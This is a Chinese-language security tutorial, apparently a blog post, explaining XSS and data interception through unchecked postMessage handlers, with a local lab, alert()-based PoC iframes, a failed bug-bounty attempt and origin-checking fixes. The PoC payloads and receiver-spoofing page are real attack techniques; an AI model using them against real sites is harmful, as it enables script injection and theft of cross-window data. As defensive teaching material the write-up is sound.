看国外好多这种漏洞，刚好挖掘某SRC的时候也发现了类似的点，所以觉得还是有必要记录一下。

##  ** **介绍****

postMessage() 方法用于安全地实现跨源通信。

参考1：<https://www.runoob.com/js/met-win-postmessage.html>

参考2：<https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage>

![1648176919_623d2f17c513235c2c5a6.png!small](https://image.3001.net/images/20220325/1648176919_623d2f17c513235c2c5a6.png!small)

[!note]

我感觉就是给数据发送到window中，就这么简单。

至于出现XSS，就是因为window对发送的数据处理不当造成的，

看理论可能比较抽象，建议直接看例子。

##  ** **环境搭建****

###  ** **接收数据页面****

挖SRC时，目标页面有类似的写法，主要是定位到EventListener

    
    
    <!-- rec.html -->
    <head><metacharset="UTF-8"></head>
    
    <divid="receiveMessage">
    Hello World!
    </div>
    
    <script>
    window.onload = function() {
    window.addEventListener('message', function(e) {  // 监听 message 事件
    alert(e.origin);
    document.getElementById('receiveMessage').innerHTML = "从"+ e.origin +"收到消息： " + e.data;
    });
    }
    </script>

###  ** **发送数据页面****

我们构造的发送数据的POC

    
    
    <!-- poc.html -->
    <title>Postmessage PoC</title>
    <script>
    functionpocFrame(win) {
    letmsg = "hello d4m1ts";
    
    win.postMessage(msg, '*');
    }
    </script>
    <iframesrc="http://127.0.0.1:9000/rec.html" onload="pocFrame(this.contentWindow)"></iframe>

###  ** **使用验证****

先启动一个简单的web服务器，可以用python；

python3 -m http.server --bind 127.0.0.1 9000；

然后访问<http://127.0.0.1:9000/poc.html>

![1648176938_623d2f2a95dbc0edab9e2.png!small](https://image.3001.net/images/20220325/1648176938_623d2f2a95dbc0edab9e2.png!small)

###  ** **XSS利用****

前面说了，出现XSS，是因为window对发送的数据处理不当造成的，咱们分析一下这里的接收数据页面

![1648176943_623d2f2fba544176e4b17.png!small](https://image.3001.net/images/20220325/1648176943_623d2f2fba544176e4b17.png!small)

所以我们只需要改一下POC。

    
    
    <!-- poc.html -->
    <title>Postmessage PoC</title>
    <script>
    functionpocFrame(win) {
    letmsg = "hello d4m1ts<img src=x onerror=alert(1)>";
    
    win.postMessage(msg, '*');
    }
    </script>
    <iframesrc="http://127.0.0.1:9000/rec.html" onload="pocFrame(this.contentWindow)"></iframe>

然后访问

![1648176951_623d2f37f2f6bc0f2a016.png!small](https://image.3001.net/images/20220325/1648176951_623d2f37f2f6bc0f2a016.png!small)

也就成功造成了XSS。

##  ** **修复方案****

验证来源，也就是验证origin。如下，只接受来自http://127.0.0.1:9001的message

    
    
    <!-- rec.html -->
    <head><metacharset="UTF-8"></head>
    
    <divid="receiveMessage">
    Hello World!
    </div>
    
    <script>
    window.onload = function() {
    window.addEventListener('message', function(e) {  // 监听 message 事件
    alert(e.origin);
    if(e.origin === "http://127.0.0.1:9001") {
    document.getElementById('receiveMessage').innerHTML = "从"+ e.origin +"收到消息： " + e.data;
    } else{
    alert("hacker");
    }
    });
    }
    </script>

![1648176958_623d2f3eda336b89faef0.png!small](https://image.3001.net/images/20220325/1648176958_623d2f3eda336b89faef0.png!small)

##  ** **不成功的实例****

某SRC，分析源码发现了addEventListener

![1648176964_623d2f4423632994f9000.png!small](https://image.3001.net/images/20220325/1648176964_623d2f4423632994f9000.png!small)

继续往下分析，验证了origin，所以除非origin中存在可控页面，如允许上传HTML，否则利用起来很难

假如我们可控origin，后面也会调用jquery中对象的text()方法，这个方法是自带有实体化编码的，所以就算绕过了也利用不了。

##  ** **扩展****

刚才我们的举例，其实是相当于伪造了发送端，然后目标为接收端，接收端对数据没有正确处理，从而导致了XSS漏洞。

那我们是否可以伪造接收端，然后截取到发送的数据呢？答案也是可以的。

以上面的发送端为例。

    
    
    <!-- poc.html -->
    <script>
    letmsg = "hello d4m1ts<img src=x onerror=alert(1)>";
    window.parent.postMessage(msg, '*');
    </script>

因为window.parent.postMessage(msg, '*');，第二个参数没有指定origin，所以我们可以构造POC如下：

    
    
    <!-- poc2.html -->
    <scripttype="text/javascript">
    onmessage = function(e) {
    alert(e.origin)
    alert(e.data)
    };
    </script>  
    <iframesrc="http://127.0.0.1:9000/poc.html"></iframe>

![1648176975_623d2f4f4d4cf95cb327f.png!small](https://image.3001.net/images/20220325/1648176975_623d2f4f4d4cf95cb327f.png!small)

也就成功接收到了数据。

 ** **修复建议：****

postMessage()指定第二个参数为指定的origin，如：

    
    
    <script>
    letmsg = "hello d4m1ts<img src=x onerror=alert(1)>";
    window.parent.postMessage(msg, 'http://127.0.0.1:9001'); // 限制只能给 http://127.0.0.1:9001 发送数据
    </script>

